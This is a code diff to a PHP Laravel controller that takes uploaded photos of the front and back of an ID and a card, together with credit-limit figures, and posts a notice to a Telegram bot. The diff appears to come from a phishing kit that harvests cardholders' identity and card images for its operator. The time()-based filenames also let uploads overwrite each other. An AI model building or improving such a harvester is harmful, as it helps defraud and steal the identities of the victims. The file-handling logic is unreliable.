@@ -27,11 +27,26 @@ class CustomerController extends Controller
             'imageIds.required' => 'Vui lòng chọn ảnh',
             'imageIds.array' => 'Ảnh không đúng định dạng',
         ]);
-
-        $mattruoc_name = $request->imageIds[0];
-        $matsau_name = $request->imageIds[1];
-        $mattruoc_card_name = $request->imageIds[2];
-        $matsau_card_name = $request->imageIds[3];
+        // loop imageIds save to storage
+        // save image
+        $mattruoc_name = '';
+        $matsau_name = '';
+        $mattruoc_card_name = '';
+        $matsau_card_name = '';
+        foreach ($request->imageIds as $imageId) {
+            $image = $request->file('image-' . $imageId);
+            $image_name = 'image-' . time() . '.' . $image->extension();
+            $image->storeAs('public', $image_name);
+            if ($imageId == 1) {
+                $mattruoc_name = asset('storage/' . $image_name);
+            } else if ($imageId == 2) {
+                $matsau_name = asset('storage/' . $image_name);
+            } else if ($imageId == 3) {
+                $mattruoc_card_name = asset('storage/' . $image_name);
+            } else if ($imageId == 4) {
+                $matsau_card_name = asset('storage/' . $image_name);
+            }
+        }
 
         // send html
         $message = " <b>Có khách hàng mới:</b> \n";
@@ -40,16 +55,6 @@ class CustomerController extends Controller
         $message .= " <b>Giới hạn hiện tại:</b> " . $request->limit_now . "\n";
         $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
         $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
-        // ảnh mặt trước
-        // $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";
-
-        // // ảnh mặt sau
-
-        // $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";
-
-        // // ảnh mặt trước thẻ
-
-        // $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";
 
 
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
